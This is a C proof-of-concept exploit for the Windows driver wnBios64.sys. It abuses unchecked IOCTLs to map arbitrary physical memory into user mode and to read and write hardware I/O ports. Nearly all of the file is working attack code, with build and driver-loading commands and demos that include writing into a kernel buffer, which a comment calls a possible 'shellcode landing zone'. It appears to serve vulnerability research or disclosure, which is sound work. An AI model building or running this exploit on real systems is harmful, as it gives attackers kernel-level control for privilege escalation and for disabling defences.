/*
 * wnBios64_poc.c
 *
 * Proof-of-Concept: Arbitrary Physical Memory R/W via wnBios64.sys
 *
 * Driver:   1432790590_wnBios64.sys
 * Device:   \\.\WNBIOS  (\Device\WNBIOS)
 * SHA-256:  530d9223ec7e4123532a403abef96dfd1af5291eb49497392ff5d14d18fccfbb
 *
 * Vulnerability: IrpDispatch (0x11104) exposes IOCTL_MAP_PHYSICAL_MEMORY which
 * opens \Device\PhysicalMemory and calls ZwMapViewOfSection with the caller-
 * supplied physical address and size — no bounds checks, no privilege checks.
 * Combined with direct I/O port R/W this gives full hardware-level control.
 *
 * Build (MSVC):
 *   cl /W4 /O2 /nologo wnBios64_poc.c /link /out:wnbios_poc.exe
 *
 * Requirements:
 *   - wnBios64.sys loaded (e.g. via sc create / OSR Driver Loader)
 *   - Admin rights to open the device (default DACL allows it)
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* ──────────────────────────────────────────────────────────
 *  IOCTL codes (METHOD_BUFFERED, FILE_ANY_ACCESS, type=0x8010)
 * ────────────────────────────────────────────────────────── */
#define IOCTL_WNBIOS_MAP_PHYS       0x80102040  /* map physical addr → user VA     */
#define IOCTL_WNBIOS_UNMAP_PHYS     0x80102044  /* unmap previously mapped region   */
#define IOCTL_WNBIOS_READ_PORT      0x80102050  /* IN  al/ax/eax, port              */
#define IOCTL_WNBIOS_WRITE_PORT     0x80102054  /* OUT port, al/ax/eax              */
#define IOCTL_WNBIOS_GET_PHYS_INFO  0x80102060  /* get pre-allocated buffer info    */

/* ──────────────────────────────────────────────────────────
 *  Buffer layouts (derived from driver's stack layout in IrpDispatch)
 * ──────────────────────────────────────────────────────────
 *
 * MAP / UNMAP  — 40 bytes total, same struct for both directions:
 *   [0x00] UINT64  Size          (in)  bytes to map
 *   [0x08] UINT64  PhysAddr      (in)  target physical address
 *   [0x10] HANDLE  SectionHandle (out) returned by MAP, consumed by UNMAP
 *   [0x18] PVOID   MappedVA      (out) returned by MAP, consumed by UNMAP
 *   [0x20] PVOID   SectionObject (out) returned by MAP, consumed by UNMAP
 *
 * READ PORT  — input 7 bytes, output overwrites bytes [0..3]:
 *   [0x00] UINT16  Port          (in)  0x0000–0xFFFF
 *   [0x02] UINT8   _pad[4]       (in)  unused for read
 *   [0x06] UINT8   AccessSize    (in)  1 = byte, 2 = word, 4 = dword
 *   --- output (4 bytes written to [0..3]) ---
 *   [0x00] UINT32  Value         (out) read result (bytes 0-3 overwritten)
 *
 * WRITE PORT — 7 bytes:
 *   [0x00] UINT16  Port          (in)  0x0000–0xFFFF
 *   [0x02] UINT32  Value         (in)  value to write (1/2/4 bytes per AccessSize)
 *   [0x06] UINT8   AccessSize    (in)  1 = byte, 2 = word, 4 = dword
 */

#pragma pack(push, 1)
typedef struct {
    uint64_t Size;          /* [0x00] bytes to map                              */
    uint64_t PhysAddr;      /* [0x08] target physical address                   */
    HANDLE   SectionHandle; /* [0x10] output: section handle                    */
    PVOID    MappedVA;      /* [0x18] output: usermode virtual address          */
    PVOID    SectionObject; /* [0x20] output: section object (for deref/close)  */
} WNBIOS_PHYS_MEM;          /* sizeof = 40 (0x28)                               */

typedef struct {
    uint16_t Port;          /* [0x00] I/O port number                           */
    uint32_t Value;         /* [0x02] write value in / read value out (bytes 0-3) */
    uint8_t  AccessSize;    /* [0x06] 1=byte  2=word  4=dword                   */
} WNBIOS_IO_PORT;           /* sizeof = 7                                       */
#pragma pack(pop)

/* ──────────────────────────────────────────────────────────
 *  Device handle
 * ────────────────────────────────────────────────────────── */
static HANDLE g_hDev = INVALID_HANDLE_VALUE;

static BOOL OpenDevice(void) {
    g_hDev = CreateFileA(
        "\\\\.\\WNBIOS",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hDev == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] CreateFile(\\\\.\\WNBIOS) failed: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

/* ──────────────────────────────────────────────────────────
 *  Physical memory mapping
 * ────────────────────────────────────────────────────────── */

/*
 * PhysMap – maps [physAddr, physAddr+size) into this process.
 * Fills *ctx with section handle/object for later PhysUnmap.
 * Returns the mapped VA, or NULL on failure.
 */
static void *PhysMap(uint64_t physAddr, uint64_t size, WNBIOS_PHYS_MEM *ctx) {
    memset(ctx, 0, sizeof(*ctx));
    ctx->PhysAddr = physAddr;
    ctx->Size     = size;

    DWORD returned = 0;
    BOOL ok = DeviceIoControl(
        g_hDev,
        IOCTL_WNBIOS_MAP_PHYS,
        ctx, sizeof(*ctx),   /* input  */
        ctx, sizeof(*ctx),   /* output (same buffer — METHOD_BUFFERED) */
        &returned, NULL);

    if (!ok || !ctx->MappedVA) {
        fprintf(stderr, "  [!] MAP_PHYS(0x%llX, 0x%llX) failed (err=%lu, va=%p)\n",
                physAddr, size, GetLastError(), ctx->MappedVA);
        return NULL;
    }
    return ctx->MappedVA;
}

/*
 * PhysUnmap – unmaps a region previously mapped by PhysMap.
 * Passes SectionHandle, MappedVA, SectionObject back to the driver.
 */
static void PhysUnmap(WNBIOS_PHYS_MEM *ctx) {
    DWORD returned = 0;
    DeviceIoControl(g_hDev, IOCTL_WNBIOS_UNMAP_PHYS,
                    ctx, sizeof(*ctx), ctx, sizeof(*ctx), &returned, NULL);
    ctx->MappedVA = NULL;
}

/*
 * PhysRead8 / PhysRead64 – convenience wrappers.
 * Maps one page around the target physical address and reads from it.
 */
static uint8_t PhysRead8(uint64_t physAddr) {
    WNBIOS_PHYS_MEM ctx;
    uint64_t pageBase = physAddr & ~0xFFFULL;
    uint64_t offset   = physAddr - pageBase;
    uint8_t *p = (uint8_t *)PhysMap(pageBase, 0x1000, &ctx);
    uint8_t val = p ? p[offset] : 0xFF;
    if (p) PhysUnmap(&ctx);
    return val;
}

static void PhysWrite8(uint64_t physAddr, uint8_t val) {
    WNBIOS_PHYS_MEM ctx;
    uint64_t pageBase = physAddr & ~0xFFFULL;
    uint64_t offset   = physAddr - pageBase;
    uint8_t *p = (uint8_t *)PhysMap(pageBase, 0x1000, &ctx);
    if (p) {
        p[offset] = val;
        PhysUnmap(&ctx);
    }
}

/* ──────────────────────────────────────────────────────────
 *  I/O port access
 * ────────────────────────────────────────────────────────── */

static uint32_t PortRead(uint16_t port, uint8_t accessSize) {
    /*
     * Input layout: [port:2][pad:4][size:1]  (7 bytes)
     * Output: system buffer [0..3] = result (overwrites port field)
     * We use separate in/out buffers via DeviceIoControl to avoid
     * aliasing confusion; the kernel uses max(in,out) for METHOD_BUFFERED.
     */
    uint8_t inBuf[7]  = {0};
    uint32_t outVal   = 0;
    *(uint16_t *)inBuf = port;
    inBuf[6] = accessSize;

    DWORD returned = 0;
    DeviceIoControl(g_hDev, IOCTL_WNBIOS_READ_PORT,
                    inBuf, sizeof(inBuf),
                    &outVal, sizeof(outVal),
                    &returned, NULL);
    return outVal;
}

static void PortWrite(uint16_t port, uint32_t value, uint8_t accessSize) {
    WNBIOS_IO_PORT req;
    req.Port       = port;
    req.Value      = value;
    req.AccessSize = accessSize;

    DWORD returned = 0;
    DeviceIoControl(g_hDev, IOCTL_WNBIOS_WRITE_PORT,
                    &req, sizeof(req), &req, sizeof(req), &returned, NULL);
}

/* ──────────────────────────────────────────────────────────
 *  Demonstration functions
 * ────────────────────────────────────────────────────────── */

/* Demo 1: Read and dump the first 64 bytes of physical RAM.
 * Physical address 0x0 = real-mode Interrupt Vector Table (IVT) on legacy BIOS.
 * On UEFI systems this page may contain different data, but is always readable. */
static void Demo_ReadPhysZero(void) {
    printf("\n[DEMO 1] Reading physical address 0x0000 (first 64 bytes of RAM)\n");

    WNBIOS_PHYS_MEM ctx;
    uint8_t *p = (uint8_t *)PhysMap(0x0, 0x1000, &ctx);
    if (!p) return;

    printf("  Mapped VA: %p\n", p);
    printf("  Hexdump phys[0x00 .. 0x3F]:\n  ");
    for (int i = 0; i < 64; i++) {
        printf("%02X ", p[i]);
        if ((i & 0xF) == 0xF) printf("\n  ");
    }
    printf("\n");

    PhysUnmap(&ctx);
    printf("  [+] Unmapped.\n");
}

/* Demo 2: Scan the BIOS shadow area (0xE0000–0xFFFFF) for ACPI RSDP.
 * "RSD PTR " signature aligned to 16-byte boundary. */
static void Demo_FindAcpiRsdp(void) {
    printf("\n[DEMO 2] Scanning BIOS area 0xE0000–0xFFFFF for ACPI RSDP\n");

    WNBIOS_PHYS_MEM ctx;
    uint8_t *p = (uint8_t *)PhysMap(0xE0000, 0x20000, &ctx);
    if (!p) return;

    BOOL found = FALSE;
    for (uint32_t off = 0; off < 0x20000; off += 16) {
        if (memcmp(p + off, "RSD PTR ", 8) == 0) {
            uint32_t rsdtAddr = *(uint32_t *)(p + off + 16);
            uint64_t xsdtAddr = *(uint64_t *)(p + off + 24);
            printf("  [+] RSDP found at phys 0x%05X\n", 0xE0000u + off);
            printf("      OEM ID    : %.6s\n", p + off + 9);
            printf("      Revision  : %u\n",  p[off + 15]);
            printf("      RSDT Addr : 0x%08X\n", rsdtAddr);
            if (p[off + 15] >= 2)
                printf("      XSDT Addr : 0x%016llX\n", (unsigned long long)xsdtAddr);
            found = TRUE;
            break;
        }
    }
    if (!found)
        printf("  RSDP not found in 0xE0000–0xFFFFF (UEFI may place it elsewhere).\n");

    PhysUnmap(&ctx);
}

/* Demo 3: I/O port access — read keyboard controller status and CMOS RTC.
 * These are safe read-only probes that demonstrate unrestricted port access. */
static void Demo_IoPorts(void) {
    printf("\n[DEMO 3] Direct I/O port access\n");

    /* PS/2 keyboard controller status register (port 0x64) */
    uint32_t ps2 = PortRead(0x64, 1);
    printf("  Port 0x0064 (PS/2 KBC status) = 0x%02X\n", ps2 & 0xFF);
    printf("    OBF (output buffer full) = %u\n", ps2 & 1);
    printf("    IBF (input  buffer full) = %u\n", (ps2 >> 1) & 1);
    printf("    SYS flag                 = %u\n", (ps2 >> 2) & 1);

    /* CMOS RTC: select register 0 (seconds), then read port 0x71 */
    PortWrite(0x70, 0x00, 1);  /* select RTC register 0 = seconds */
    uint32_t sec_bcd = PortRead(0x71, 1) & 0xFF;
    uint32_t seconds = ((sec_bcd >> 4) * 10) + (sec_bcd & 0xF);
    printf("  CMOS RTC seconds (via 0x70/0x71): BCD=0x%02X → %u sec\n",
           sec_bcd, seconds);

    /* PCI config: vendor/device ID of bus 0, device 0, function 0 (usually host bridge) */
    PortWrite(0xCF8, 0x80000000, 4);  /* PCI config addr: bus=0 dev=0 fn=0 reg=0 */
    uint32_t pciVendDev = PortRead(0xCFC, 4);
    printf("  PCI Bus0/Dev0/Fn0 VendorID:DeviceID = %04X:%04X\n",
           pciVendDev & 0xFFFF, pciVendDev >> 16);
}

/* Demo 4: Query the driver's pre-allocated contiguous buffer info.
 * Shows that the driver itself exposes a kernel buffer VA and physical address
 * which could be used as a DMA staging area or shellcode landing zone. */
static void Demo_GetPhysInfo(void) {
    printf("\n[DEMO 4] IOCTL_GET_PHYS_INFO — pre-allocated 64KB kernel buffer\n");

    WNBIOS_PHYS_MEM info;
    memset(&info, 0, sizeof(info));
    /* Driver fills: info.Size (0x10000), info.PhysAddr, info.MappedVA (kernel VA) */

    DWORD returned = 0;
    if (!DeviceIoControl(g_hDev, IOCTL_WNBIOS_GET_PHYS_INFO,
                         &info, sizeof(info), &info, sizeof(info),
                         &returned, NULL)) {
        fprintf(stderr, "  [!] GET_PHYS_INFO failed: %lu\n", GetLastError());
        return;
    }

    printf("  Buffer size  : 0x%llX (%llu bytes)\n",
           info.Size, info.Size);
    printf("  Kernel VA    : %p\n", info.MappedVA);
    printf("  Physical addr: 0x%016llX\n", info.PhysAddr);
    printf("  Note: caller can re-map the phys addr to a user VA to R/W this kernel buffer.\n");
}

/* Demo 5: Re-read kernel buffer via its physical address to prove full R/W.
 * Maps the pre-allocated kernel buffer's physical address and reads it as user. */
static void Demo_ReadKernelBuffer(void) {
    printf("\n[DEMO 5] Re-mapping kernel's contiguous buffer via physical address\n");

    /* First get the physical address */
    WNBIOS_PHYS_MEM info;
    memset(&info, 0, sizeof(info));
    DWORD returned = 0;
    if (!DeviceIoControl(g_hDev, IOCTL_WNBIOS_GET_PHYS_INFO,
                         &info, sizeof(info), &info, sizeof(info),
                         &returned, NULL)) {
        fprintf(stderr, "  [!] GET_PHYS_INFO failed: %lu\n", GetLastError());
        return;
    }

    uint64_t physAddr = info.PhysAddr;
    printf("  Kernel buffer phys addr: 0x%016llX\n", physAddr);

    /* Map the physical address into our user-mode process */
    WNBIOS_PHYS_MEM ctx;
    uint8_t *p = (uint8_t *)PhysMap(physAddr, 0x1000, &ctx);
    if (!p) return;

    printf("  Mapped user VA: %p\n", p);
    printf("  Writing 0xDE 0xAD 0xBE 0xEF to physical buffer...\n");
    p[0] = 0xDE; p[1] = 0xAD; p[2] = 0xBE; p[3] = 0xEF;

    printf("  Read back: %02X %02X %02X %02X\n", p[0], p[1], p[2], p[3]);
    printf("  [+] Arbitrary physical R/W confirmed.\n");

    PhysUnmap(&ctx);
}

/* ──────────────────────────────────────────────────────────
 *  Entry point
 * ────────────────────────────────────────────────────────── */
int main(void) {
    printf("=========================================\n");
    printf(" wnBios64.sys Physical R/W PoC\n");
    printf(" Driver: 1432790590_wnBios64.sys\n");
    printf(" Device: \\\\.\\WNBIOS\n");
    printf("=========================================\n");

    if (!OpenDevice()) {
        fprintf(stderr,
            "Ensure the driver is loaded:\n"
            "  sc create wnbios type= kernel binPath= C:\\path\\to\\wnBios64.sys\n"
            "  sc start wnbios\n");
        return 1;
    }
    printf("[+] Opened \\\\.\\WNBIOS (handle %p)\n", g_hDev);

    Demo_ReadPhysZero();
    Demo_FindAcpiRsdp();
    Demo_IoPorts();
    Demo_GetPhysInfo();
    Demo_ReadKernelBuffer();

    CloseHandle(g_hDev);
    printf("\n[+] Done.\n");
    return 0;
}
